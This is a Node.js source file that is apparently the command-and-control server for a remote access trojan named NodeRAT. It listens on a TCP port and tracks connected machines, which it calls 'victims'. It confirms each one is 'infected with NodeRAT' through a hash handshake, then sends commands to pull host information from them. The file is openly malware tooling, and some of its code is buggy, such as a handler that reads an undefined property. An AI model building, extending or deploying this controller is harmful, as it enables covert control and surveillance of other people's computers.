const net = require("net");
const { EventEmitter } = require("events");
const crypto = require("crypto");
const Settings = require("./settings");
const Store = require("./Stores/serverStore");
const Action = require("./Actions/serverAction");

const Constants = {
    "connectedVictims": "connectedVics",
    "MessageResponseName": {
        "intialcontact" : "intialContanctDataHandler"
    }
};

function md5(str) {
    let hash = crypto.createHash("md5");
    hash.update(str);
    return hash.digest("hex");
}

class Server extends EventEmitter{
    constructor(){
        super();
        this.connectedGuests = {};
        Settings.autoSave(true)
        this.port = null;
        this.CoreAction = null;
        this.CoreStore = null;
        Store.set(Constants.connectedVictims, {})
        this.NodeRatHash = md5("noderat");
        this._export = {
            Store,
            Action,
            Constants
        }
    }

    start({ CoreAction = null, CoreStore = null , port = 1528}){
        if (CoreAction != null || CoreStore != null || port != null) {
            this.port = port;
            this.CoreAction = CoreAction;
            this.CoreStore = CoreStore;
        } else {
            throw new Error("Dependcies are missing on Server");
        }

        console.log(`server started on port ${this.port}`);
        this.server = net.createServer((conn) => {

            // ----------- on connection
            let ip = conn.remoteAddress;

            this.connectedGuests[ip] = {
                status: 1,
                nodeRAT: false,
                intialContact: false,
                hashAuthFail : {
                    count: 0,
                    failed: false,
                    hint : null
                },
                conn,
                ip,
                data : null
            };

            Action.push(Constants.connectedVictims, {
                key: ip,
                payload: this.connectedGuests[ip]
            });

            this.checkService({conn, ip})

            // ---------- connection ended 
            console.log(ip, "connected");
            conn.on("end", () => {
                if (Store.get(Constants.connectedVictims)[ip]){
                    this.connectedGuests[ip].status = 0;
                    Action.push(Constants.connectedVictims, {key: ip, payload : this.connectedGuests[ip]});
                }
                console.warn(ip, "disconnected");
            });
            // ------------ data was recived
            conn.on("data", (data) => this.socketDataHandler({data : data.toString() , conn, ip, bytes : data}));
        });
        this.server.listen(this.port, "0.0.0.0");
        this.intialContanctInvoker();
    }

    makeCommand(method = "", args = []){
        return JSON.stringify({
            "command": [method, ...args]
        });
    }

    listenForPortUpdate(){
        if(this.CoreAction != null || this.CoreStore  != null){
            this.CoreStore.on("RATMainTCPPort@UPDATED", (port) => {
                console.log("port changed", port);
                this._changePort(port);
            });
        }else{
            throw new Error("Could Not Listen for tcp port change");
        }
    }

    export(exports){
        let toReturn = {};
        for (let key in exports) {
            if (exports.hasOwnProperty(key) && typeof this._export[key] != undefined) {
                toReturn[exports[key]] = this._export[key] == undefined ? null : this._export[key];
            }else{
                throw new Error(`can not export unknown method(${key}) in Server ${this._export}`);
                return;
            }
        }
        return toReturn;
    }

    _changePort(port){
       Settings.set({
            obj : "network.port.tcp.use",
            value : port
        });
        this.CoreStore.customEvent("ApplicationNeedsRestart", "Server Port Updated");

    }

    socketDataHandler({data, conn, ip, bytes}){
        let json;
        console.log(`socketDataHandler${ip} >`, data);
        try {
            json = JSON.parse(data);
        } catch (error) {
            throw new Error("not a vailed JSON at server > socketDataHandler");
            return;
        }

        if(json && json.name != ""){
            if(json.name in Constants.MessageResponseName){
                this[ Constants.MessageResponseName[ json.name ] ]({
                    payload : json.payload,
                    rawPayload: {bytes, data},
                    requestName : json.name,
                    conn,
                    ip
                });
            }
        }

    }

    checkService({conn, ip}){
        conn.write(this.makeCommand("whois"));
        let bytes,
            vic = this.connectedGuests[ip],
            timeout = setTimeout(() => {

            vic.hashAuthFail.count++;
            vic.hashAuthFail.failed = true;
            vic.hashAuthFail.hint = "this device is not infected with NodeRAT";
    
            Action.push(Constants.connectedVictims, { key: ip, payload: vic });

        }, 30 * 1000); // when no answer then it's not our rat

        conn.on("data", (data) => {
            clearTimeout(timeout);
            bytes = data;
            data = data.toString();
            try {
                data = JSON.parse(data)
            } catch (error) {
                throw new Error("not a vailed JSON at server > checkService");
                return;
            }
            
            if (data && data.name == "whois") {
                console.log(`serviceCheck[${data.name}]: hashCheck(${data.payload} == ${this.NodeRatHash}) ${data.payload == this.NodeRatHash}`);

                if (data.payload == this.NodeRatHash) {

                    vic.nodeRAT = true;

                    Action.push(Constants.connectedVictims, { key: ip, payload: vic });

                } else {

                    vic.hashAuthFail.count++;

                    vic.hashAuthFail.failed = true;

                    Action.push(Constants.connectedVictims, { key: ip, payload: vic });

                }

            }
        });
    }

    intialContanctInvoker(){
        Store.on(`${Constants.connectedVictims}@UPDATED`, (v) => {
            console.log("intialcontact:", v);
            if(v.status == 1 && v.nodeRAT == true && v.intialContact == false){
                v.conn.write(this.makeCommand("hostInfo"));
            }
        });
    }
/*
                    data parsers and server gui reporter methods should be bellow this comment
    @params 
    {
        payload : json.payload,
        rawPayload: {bytes, data},
        requestName : json.name,
        conn,
        ip
    }
}
*/
    intialContanctDataHandler({payload, rawPayload, requestName, conn, ip}){
        let p = this[Constants.connectedVictims][ip].data = payload;
        Action.push(Constants.connectedVictims, {key : ip, payload : p});
    }
}

module.exports = new Server;